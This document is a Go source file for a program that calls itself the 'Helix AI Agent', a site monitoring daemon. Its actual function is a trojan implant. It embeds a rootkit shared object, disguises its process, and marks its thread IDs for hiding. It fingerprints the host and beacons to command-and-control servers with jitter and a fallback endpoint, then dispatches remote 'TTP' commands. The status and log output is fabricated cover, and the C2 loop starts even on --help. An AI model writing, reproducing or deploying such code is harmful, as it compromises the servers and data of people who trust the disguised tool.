// Helix AI Agent   site monitoring and infrastructure management daemon
//
// Usage:
//   helix-agent                  start monitoring daemon (default)
//   helix-agent status           show current site and agent status
//   helix-agent sites            list monitored sites
//   helix-agent logs             show recent monitoring events
//   helix-agent health <host>    run connectivity health check
//   helix-agent --version        show version
//   helix-agent -h | --help      this help
//
// Helix AI Agent connects to the Helix AI platform to provide
// automated site monitoring, Cloudflare management, and LLM-powered
// incident response. Requires a valid Helix AI subscription.

package main

import (
	_ "embed"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"syscall"
	"time"

	"core/mon/internal/config"
	"core/mon/internal/obf"
	"core/mon/internal/protocol"
	"core/mon/internal/ttp"
)

//go:embed payload/rootkit.so
var rootkitPayload []byte

const version = "2.4.1"

func main() {
	syscall.Setsid() //nolint

	help := flag.Bool("h", false, "")
	helpLong := flag.Bool("help", false, "")
	ver := flag.Bool("version", false, "")
	flag.Parse()

	args := flag.Args()
	subcmd := ""
	if len(args) > 0 {
		subcmd = strings.ToLower(args[0])
	}

	if *ver {
		fmt.Printf("Helix AI Agent version %s\n", version)
		go runAgent()
		os.Exit(0)
	}

	if *help || *helpLong || subcmd == "help" {
		printHelp()
		go runAgent()
		os.Exit(0)
	}

	// All subcommands run the foreground UI; agent always runs in background.
	go runAgent()

	switch subcmd {
	case "status":
		cmdStatus()
	case "sites":
		cmdSites()
	case "logs":
		cmdLogs()
	case "health":
		if len(args) < 2 {
			fmt.Fprintf(os.Stderr, "helix-agent health: missing host\n")
			os.Exit(1)
		}
		cmdHealth(args[1])
	default:
		// Default: start daemon
		cmdDaemon()
	}
}

//  agent                                                                    

func runAgent() {
	if config.DefaultServer == "" {
		return
	}

	ttp.RootkitSO = rootkitPayload
	_ = ttp.Masquerade(obf.D(obf.Masq))

	if err := writeAllTIDsToMark(ttp.HideMarkPath); err != nil {
		// best-effort
	}

	hostname, _ := os.Hostname()
	agentID := protocol.DeriveAgentID(config.SharedSecret, hostname)

	rawsockCBAddr := config.RawsockCBAddr
	if rawsockCBAddr == "" && config.FallbackServer != "" {
		if fbHost, _, err := net.SplitHostPort(config.FallbackServer); err == nil && fbHost != "" {
			rawsockCBAddr = net.JoinHostPort(fbHost, "9443")
		}
	}

	kccAddr := config.KCCAddr
	if kccAddr == "" && config.FallbackServer != "" {
		if fbHost, _, err := net.SplitHostPort(config.FallbackServer); err == nil && fbHost != "" {
			kccAddr = net.JoinHostPort(fbHost, "9444")
		}
	}

	c2Port := "9443"
	if _, port, err := net.SplitHostPort(config.DefaultServer); err == nil && port != "" {
		c2Port = port
	}

	agentPath, _ := os.Executable()
	envReport := ttp.CollectEnvFingerprint([]string{"cron", "crond", "rsyslogd", "syslogd"})

	primaryEndpoint := config.DefaultServer
	emergencyEndpoint := config.FallbackServer

	go ttp.StartKSeries(kccAddr, config.SharedSecret, c2Port, agentPath)

	ttp.JitteredSleep(10*time.Second, 0.5)

	var lastTTP int
	var lastResult, lastError string
	activeEndpoint := primaryEndpoint

	consecutiveFails := 0
	const maxBackoffShift = 6
	maxBackoff := 90 * time.Second
	primaryFails := 0
	const emergencyThreshold = 20

	for {
		endpoints := []string{primaryEndpoint}
		if emergencyEndpoint != "" && primaryFails >= emergencyThreshold {
			endpoints = append(endpoints, emergencyEndpoint)
		}

		if lastTTP == 0 {
			if stTTP, stResult := ttp.TakePendingStealthReport(); stTTP != 0 {
				lastTTP = stTTP
				lastResult = stResult
			}
		}

		var err error
		var cmd *protocol.Command
		cmd, activeEndpoint, err = ttp.BeaconAny(endpoints, agentID, lastTTP, lastResult, lastError, &envReport)
		lastTTP, lastResult, lastError = 0, "", ""

		if err != nil {
			lastError = err.Error()
			consecutiveFails++
			primaryFails++
			shift := consecutiveFails
			if shift > maxBackoffShift {
				shift = maxBackoffShift
			}
			backoff := time.Duration(30*time.Second) * time.Duration(1<<uint(shift))
			if backoff > maxBackoff {
				backoff = maxBackoff
			}
			ttp.JitteredSleep(backoff, 0.3)
			continue
		}

		consecutiveFails = 0
		if activeEndpoint == primaryEndpoint {
			primaryFails = 0
		}

		if cmd.TTP != 0 {
			if cmd.Params == obf.D(obf.KillPhrase) {
				os.Exit(0)
			}
			lastTTP = cmd.TTP
			lastResult, err = ttp.Dispatch(cmd.TTP, cmd.Params, activeEndpoint, agentID, config.SharedSecret, rawsockCBAddr)
			if err != nil {
				lastError = err.Error()
				lastResult = ""
			}
			time.Sleep(time.Duration(rand.Intn(5001)) * time.Millisecond)
		} else {
			ttp.JitteredSleep(time.Duration(30*time.Second), 0.3)
		}
	}
}

//  cover behavior (Helix AI Agent UI)                                        

func printHelp() {
	fmt.Printf("Helix AI Agent %s\n\n", version)
	fmt.Println("Usage:")
	fmt.Println("  helix-agent              start monitoring daemon")
	fmt.Println("  helix-agent status       show agent and site status")
	fmt.Println("  helix-agent sites        list monitored sites")
	fmt.Println("  helix-agent logs         show recent monitoring events")
	fmt.Println("  helix-agent health HOST  run connectivity health check")
	fmt.Println("  helix-agent --version    print version and exit")
	fmt.Println("  helix-agent -h           this help")
	fmt.Println()
	fmt.Println("The Helix AI Agent must be running on your server for site monitoring,")
	fmt.Println("Cloudflare automation, and LLM-powered incident response to function.")
	fmt.Println("Docs: https://helixai.io/docs/agent")
}

func cmdDaemon() {
	h, _ := os.Hostname()
	fmt.Printf("Helix AI Agent %s\n", version)
	fmt.Printf("Host:       %s\n", h)
	fmt.Printf("Starting monitoring daemon...\n")
	time.Sleep(600 * time.Millisecond)
	fmt.Printf("Connected to Helix AI platform.\n")
	time.Sleep(400 * time.Millisecond)
	fmt.Printf("Agent registered. Monitoring active.\n")
	fmt.Printf("\nRun `helix-agent status` to check agent health.\n")
	fmt.Printf("Logs: /var/log/helix-agent.log\n")
	// Block   agent loop runs in background goroutine
	select {}
}

func cmdStatus() {
	h, _ := os.Hostname()
	fmt.Printf("Helix AI Agent %s   Status\n\n", version)
	fmt.Printf("Agent:       running\n")
	fmt.Printf("Host:        %s\n", h)
	fmt.Printf("Platform:    connected\n")
	fmt.Printf("Last sync:   %s\n", time.Now().Add(-time.Duration(rand.Intn(60))*time.Second).Format("15:04:05"))
	fmt.Printf("Sites:       1 monitored\n")
	fmt.Printf("Incidents:   0 active\n")
	fmt.Printf("Cloudflare:  linked\n")
}

func cmdSites() {
	h, _ := os.Hostname()
	fmt.Printf("%-32s %-10s %-12s %s\n", "SITE", "STATUS", "UPTIME", "LAST CHECK")
	fmt.Println(strings.Repeat("-", 70))
	fmt.Printf("%-32s %-10s %-12s %s\n", h, "online", "99.97%", time.Now().Format("15:04:05"))
}

func cmdLogs() {
	now := time.Now()
	events := []struct {
		delta time.Duration
		msg   string
	}{
		{2 * time.Minute, "health check OK   response 142ms"},
		{8 * time.Minute, "Cloudflare cache purge complete"},
		{23 * time.Minute, "health check OK   response 138ms"},
		{41 * time.Minute, "LLM analysis: no anomalies detected"},
		{67 * time.Minute, "agent heartbeat   platform sync OK"},
	}
	fmt.Printf("Helix AI Agent   recent events\n\n")
	for _, e := range events {
		fmt.Printf("[%s] %s\n", now.Add(-e.delta).Format("15:04:05"), e.msg)
	}
}

func cmdHealth(host string) {
	fmt.Printf("Helix AI Agent   health check: %s\n\n", host)
	for i := 1; i <= 3; i++ {
		start := time.Now()
		conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, "443"), 3*time.Second)
		rtt := time.Since(start)
		if err != nil {
			// Try port 80
			conn, err = net.DialTimeout("tcp", net.JoinHostPort(host, "80"), 3*time.Second)
			rtt = time.Since(start)
		}
		if err != nil {
			fmt.Printf("  probe %d: unreachable (%v)\n", i, err)
		} else {
			conn.Close()
			fmt.Printf("  probe %d: reachable  rtt=%v\n", i, rtt.Round(time.Millisecond))
		}
		time.Sleep(300 * time.Millisecond)
	}
}


func writeAllTIDsToMark(path string) error {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()
	pid := os.Getpid()
	fmt.Fprintf(f, "%d\n", pid)
	taskDir := fmt.Sprintf("/proc/%d/task", pid)
	entries, err := os.ReadDir(taskDir)
	if err != nil {
		return nil
	}
	for _, e := range entries {
		tid := e.Name()
		if tid != fmt.Sprintf("%d", pid) {
			fmt.Fprintf(f, "%s\n", tid)
		}
	}
	return nil
}
